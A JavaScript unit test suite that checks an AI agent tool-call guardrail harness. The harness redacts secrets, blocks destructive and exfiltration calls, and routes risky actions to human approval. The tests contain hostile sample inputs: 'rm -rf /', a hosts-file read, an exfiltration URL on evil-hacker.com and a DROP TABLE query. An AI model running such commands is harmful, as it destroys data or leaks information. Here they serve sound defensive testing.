/**
 * 🏛️ ANTIGRAVITY ENTERPRISE INDEPENDENT AUDIT COMMISSION
 * Unit Test Runner: FailproofPolicyHarness.test.js
 * 
 * Verifies production reliability of FailproofPolicyHarness against:
 * - FailproofAI (5.1K Stars) Resilience & Policy Guardrails
 * - TwinCheckVerifier (arXiv:2609.26836 & arXiv:2609.26911)
 * 
 * 10 Critical Verification Gates:
 * 1. Secret Leakage Detection & Auto-Redaction
 * 2. Strict Secret Blocking Invariant
 * 3. Destructive OS Command Prevention (rm -rf /)
 * 4. Path Traversal System Escape Blocking
 * 5. Prohibited Outbound Network Exfiltration (Offline Invariant)
 * 6. Autonomous Human Gate Interception (DROP TABLE)
 * 7. Human Gate Architectural Approval Sign-off (AGENTS.md)
 * 8. Chaos Fault Injection & Resilient Auto-Recovery (Self-Healing)
 * 9. Chaos Fault Exhaustion Handling (Graceful Degradation)
 * 10. TwinCheck Physical State Delta & Cryptographic SHA-256 Grounding
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const {
  SecretLeakageGuard,
  ToolSafetyEnforcer,
  HumanGateArbiter,
  ChaosFaultInjector,
  FailproofPolicyHarness
} = require('./FailproofPolicyHarness.js');

async function runUnitTests() {
  console.log('================================================================================');
  console.log('🧪 FailproofPolicyHarness Unit Test Suite');
  console.log('Target Module: c:/Users/game/.gemini/core/verification/FailproofPolicyHarness.ts');
  console.log('================================================================================\n');

  const testDir = path.resolve(__dirname, '../../antigravity/brain/scratch_test_failproof');
  if (!fs.existsSync(testDir)) {
    fs.mkdirSync(testDir, { recursive: true });
  }

  const testResults = [];

  // --------------------------------------------------------------------------
  // TEST 1: Secret Leakage Detection & Auto-Redaction
  // --------------------------------------------------------------------------
  {
    const harness = new FailproofPolicyHarness();
    const fakeKey = 'sk-proj-abc123def456ghi789jkl012mno345pqr678';
    const toolCall = {
      callId: 'call_sec_001',
      toolName: 'ai_completion_tool',
      parameters: {
        model: 'gpt-4o',
        apiKey: fakeKey,
        prompt: 'Generate documentation'
      },
      intent: 'Call AI completion with exposed key',
      declaredSideEffects: [],
      timestamp: Date.now()
    };

    let receivedParams = null;
    const executor = async (params) => {
      receivedParams = params;
      return { callId: 'call_sec_001', exitCode: 0, stdout: 'Generated', stderr: '', durationMs: 5 };
    };

    const entry = await harness.executeProtected(toolCall, executor, { workspaceDir: testDir });
    const passed =
      entry.verdict === 'SECRET_LEAKAGE_REDACTED' &&
      entry.secretsDetectedCount === 1 &&
      receivedParams.apiKey === 'sk-proj-[REDACTED_API_KEY]';

    testResults.push({
      id: 1,
      name: 'Secret Leakage Detection & Auto-Redaction',
      passed,
      verdict: entry.verdict
    });
  }

  // --------------------------------------------------------------------------
  // TEST 2: Strict Secret Blocking Invariant
  // --------------------------------------------------------------------------
  {
    const harness = new FailproofPolicyHarness();
    const fakeAnthropicKey = 'sk-ant-api03-abcdefghijklmnopqrstuvwxyz1234567890';
    const toolCall = {
      callId: 'call_sec_002',
      toolName: 'claude_chat',
      parameters: {
        token: fakeAnthropicKey,
        query: 'Refactor module'
      },
      intent: 'Execute claude chat with embedded secret in strict mode',
      declaredSideEffects: [],
      timestamp: Date.now()
    };

    let executorCalled = false;
    const executor = async () => {
      executorCalled = true;
      return { callId: 'call_sec_002', exitCode: 0, stdout: 'OK', stderr: '', durationMs: 2 };
    };

    const entry = await harness.executeProtected(toolCall, executor, {
      workspaceDir: testDir,
      strictSecretBlocking: true
    });

    const passed =
      entry.verdict === 'SECRET_LEAKAGE_BLOCKED' &&
      !executorCalled &&
      entry.safetyPassed === false;

    testResults.push({
      id: 2,
      name: 'Strict Secret Blocking Invariant',
      passed,
      verdict: entry.verdict
    });
  }

  // --------------------------------------------------------------------------
  // TEST 3: Destructive OS Command Prevention (rm -rf /)
  // --------------------------------------------------------------------------
  {
    const harness = new FailproofPolicyHarness();
    const toolCall = {
      callId: 'call_safe_003',
      toolName: 'run_command',
      parameters: {
        CommandLine: 'rm -rf / --no-preserve-root',
        Cwd: testDir
      },
      intent: 'Execute malicious destructive shell command',
      declaredSideEffects: [],
      timestamp: Date.now()
    };

    let executorCalled = false;
    const executor = async () => {
      executorCalled = true;
      return { callId: 'call_safe_003', exitCode: 0, stdout: 'Deleted', stderr: '', durationMs: 1 };
    };

    const entry = await harness.executeProtected(toolCall, executor, { workspaceDir: testDir });
    const passed =
      entry.verdict === 'POLICY_VIOLATION_BLOCKED' &&
      !executorCalled &&
      entry.safetyPassed === false;

    testResults.push({
      id: 3,
      name: 'Destructive OS Command Prevention (rm -rf /)',
      passed,
      verdict: entry.verdict
    });
  }

  // --------------------------------------------------------------------------
  // TEST 4: Path Traversal System Escape Blocking
  // --------------------------------------------------------------------------
  {
    const harness = new FailproofPolicyHarness();
    const toolCall = {
      callId: 'call_safe_004',
      toolName: 'view_file',
      parameters: {
        AbsolutePath: 'C:\\Windows\\System32\\drivers\\etc\\hosts'
      },
      intent: 'Attempt to read protected system directory',
      declaredSideEffects: [],
      timestamp: Date.now()
    };

    let executorCalled = false;
    const executor = async () => {
      executorCalled = true;
      return { callId: 'call_safe_004', exitCode: 0, stdout: 'Hosts content', stderr: '', durationMs: 1 };
    };

    const entry = await harness.executeProtected(toolCall, executor, { workspaceDir: testDir });
    const passed =
      entry.verdict === 'POLICY_VIOLATION_BLOCKED' &&
      !executorCalled;

    testResults.push({
      id: 4,
      name: 'Path Traversal System Escape Blocking',
      passed,
      verdict: entry.verdict
    });
  }

  // --------------------------------------------------------------------------
  // TEST 5: Prohibited Outbound Network Exfiltration (Offline Invariant)
  // --------------------------------------------------------------------------
  {
    const harness = new FailproofPolicyHarness();
    const toolCall = {
      callId: 'call_safe_005',
      toolName: 'read_url_content',
      parameters: {
        Url: 'https://external-api.evil-hacker.com/exfiltrate'
      },
      intent: 'Exfiltrate internal state to external network',
      declaredSideEffects: [],
      timestamp: Date.now()
    };

    let executorCalled = false;
    const executor = async () => {
      executorCalled = true;
      return { callId: 'call_safe_005', exitCode: 0, stdout: 'Exfiltrated', stderr: '', durationMs: 1 };
    };

    const entry = await harness.executeProtected(toolCall, executor, { workspaceDir: testDir });
    const passed =
      entry.verdict === 'POLICY_VIOLATION_BLOCKED' &&
      !executorCalled;

    testResults.push({
      id: 5,
      name: 'Prohibited Outbound Network Exfiltration',
      passed,
      verdict: entry.verdict
    });
  }

  // --------------------------------------------------------------------------
  // TEST 6: Autonomous Human Gate Interception (DROP TABLE)
  // --------------------------------------------------------------------------
  {
    const harness = new FailproofPolicyHarness();
    const toolCall = {
      callId: 'call_hg_006',
      toolName: 'run_sql_query',
      parameters: {
        CommandLine: 'DROP TABLE enterprise_users_production;'
      },
      intent: 'Drop primary database table',
      declaredSideEffects: [],
      timestamp: Date.now()
    };

    let executorCalled = false;
    const executor = async () => {
      executorCalled = true;
      return { callId: 'call_hg_006', exitCode: 0, stdout: 'Dropped', stderr: '', durationMs: 1 };
    };

    const entry = await harness.executeProtected(toolCall, executor, { workspaceDir: testDir });
    const passed =
      entry.verdict === 'HUMAN_APPROVAL_PENDING' &&
      !executorCalled &&
      entry.humanGateTriggered === true &&
      entry.humanGateTicket?.riskLevel === 'CRITICAL';

    testResults.push({
      id: 6,
      name: 'Autonomous Human Gate Interception (DROP TABLE)',
      passed,
      verdict: entry.verdict
    });
  }

  // --------------------------------------------------------------------------
  // TEST 7: Human Gate Architectural Approval Sign-off (AGENTS.md)
  // --------------------------------------------------------------------------
  {
    const harness = new FailproofPolicyHarness();
    const toolCall = {
      callId: 'call_hg_007',
      toolName: 'write_to_file',
      parameters: {
        TargetFile: 'C:/Users/game/.gemini/config/AGENTS.md',
        CodeContent: '# Updated Operating Contract'
      },
      intent: 'Modify core enterprise invariant configuration',
      declaredSideEffects: [],
      timestamp: Date.now()
    };

    let executorCalled = false;
    const executor = async () => {
      executorCalled = true;
      return { callId: 'call_hg_007', exitCode: 0, stdout: 'File written', stderr: '', durationMs: 3 };
    };

    const entry = await harness.executeProtected(toolCall, executor, {
      workspaceDir: testDir,
      humanGateAutoApprove: true
    });

    const passed =
      entry.verdict === 'POLICY_CONFORMANT' &&
      executorCalled &&
      entry.humanGateTriggered === true &&
      entry.humanGateTicket?.status === 'APPROVED';

    testResults.push({
      id: 7,
      name: 'Human Gate Architectural Approval Sign-off',
      passed,
      verdict: entry.verdict
    });
  }

  // --------------------------------------------------------------------------
  // TEST 8: Chaos Fault Injection & Resilient Auto-Recovery (Self-Healing)
  // --------------------------------------------------------------------------
  {
    const harness = new FailproofPolicyHarness();
    let executionCalls = 0;

    const toolCall = {
      callId: 'call_chaos_008',
      toolName: 'resilient_data_sync',
      parameters: { syncTarget: 'cloud_backup' },
      intent: 'Sync state with transient network resilience',
      declaredSideEffects: [],
      timestamp: Date.now()
    };

    const executor = async () => {
      executionCalls++;
      return { callId: 'call_chaos_008', exitCode: 0, stdout: 'Synced successfully', stderr: '', durationMs: 10 };
    };

    // Bơm lỗi transient network drop đúng 1 lần (maxFaultsToInject: 1).
    // Ở lần thử 2, lỗi transient được vượt qua nhờ retry loop -> tự phục hồi thành công!
    const entry = await harness.executeProtected(toolCall, executor, {
      workspaceDir: testDir,
      maxRetries: 3,
      retryBackoffMs: 5,
      chaosConfig: {
        enabled: true,
        faultType: 'TRANSIENT_NETWORK_DROP',
        probability: 1.0,
        maxFaultsToInject: 1,
        errorMessage: 'Simulated 503 gateway drop'
      }
    });

    const passed =
      entry.verdict === 'CHAOS_FAULT_RECOVERED' &&
      entry.resilienceRecovery.attempts === 2 &&
      entry.resilienceRecovery.recovered === true &&
      executionCalls === 1;

    testResults.push({
      id: 8,
      name: 'Chaos Fault Injection & Resilient Auto-Recovery',
      passed,
      verdict: entry.verdict
    });
  }

  // --------------------------------------------------------------------------
  // TEST 9: Chaos Fault Non-Recoverable Exhaustion (Graceful Degradation)
  // --------------------------------------------------------------------------
  {
    const harness = new FailproofPolicyHarness();
    const toolCall = {
      callId: 'call_chaos_009',
      toolName: 'restricted_access_tool',
      parameters: { vaultId: 'root_vault' },
      intent: 'Access protected vault with permission denial',
      declaredSideEffects: [],
      timestamp: Date.now()
    };

    const executor = async () => {
      return { callId: 'call_chaos_009', exitCode: 0, stdout: 'Vault open', stderr: '', durationMs: 2 };
    };

    const entry = await harness.executeProtected(toolCall, executor, {
      workspaceDir: testDir,
      maxRetries: 1,
      chaosConfig: {
        enabled: true,
        faultType: 'PERMISSION_DENIED',
        probability: 1.0,
        errorMessage: 'Simulated EACCES file permission'
      }
    });

    const passed =
      entry.verdict === 'CHAOS_FAULT_EXHAUSTED' &&
      entry.chaosInjection.faultType === 'PERMISSION_DENIED';

    testResults.push({
      id: 9,
      name: 'Chaos Fault Non-Recoverable Exhaustion',
      passed,
      verdict: entry.verdict
    });
  }

  // --------------------------------------------------------------------------
  // TEST 10: TwinCheck Physical State Delta & Cryptographic SHA-256 Grounding
  // --------------------------------------------------------------------------
  {
    const harness = new FailproofPolicyHarness();
    const targetFile = 'policy_verified_output.txt';
    const filePath = path.join(testDir, targetFile);

    // Xóa file cũ nếu có trước test
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }

    const toolCall = {
      callId: 'call_twin_010',
      toolName: 'file_writer',
      parameters: { targetPath: targetFile, content: 'Enterprise Policy Verified 100%' },
      intent: 'Write verified file with physical SHA-256 confirmation',
      declaredSideEffects: [
        {
          type: 'FILE_CREATE',
          target: targetFile,
          minBytes: 10
        }
      ],
      timestamp: Date.now()
    };

    const executor = async (params) => {
      fs.writeFileSync(filePath, params.content, 'utf8');
      return { callId: 'call_twin_010', exitCode: 0, stdout: 'File written successfully', stderr: '', durationMs: 8 };
    };

    const entry = await harness.executeProtected(toolCall, executor, { workspaceDir: testDir });
    const fileExists = fs.existsSync(filePath);
    const passed =
      entry.verdict === 'POLICY_CONFORMANT' &&
      fileExists &&
      entry.stateVerification?.verdict === 'VERIFIED_GENUINE' &&
      entry.stateVerification?.sha256Evidence[0]?.verified === true;

    testResults.push({
      id: 10,
      name: 'TwinCheck Physical State Delta & Cryptographic SHA-256 Grounding',
      passed,
      verdict: entry.verdict
    });
  }

  console.table(testResults);
  const allPassed = testResults.every(r => r.passed);
  console.log(`\nUnit Tests Result: ${allPassed ? 'ALL 10 TESTS PASSED ✅' : 'FAILURES DETECTED ❌'}`);

  if (fs.existsSync(testDir)) {
    fs.rmSync(testDir, { recursive: true, force: true });
  }

  if (!allPassed) {
    process.exit(1);
  }
}

runUnitTests().catch(err => {
  console.error(err);
  process.exit(1);
});
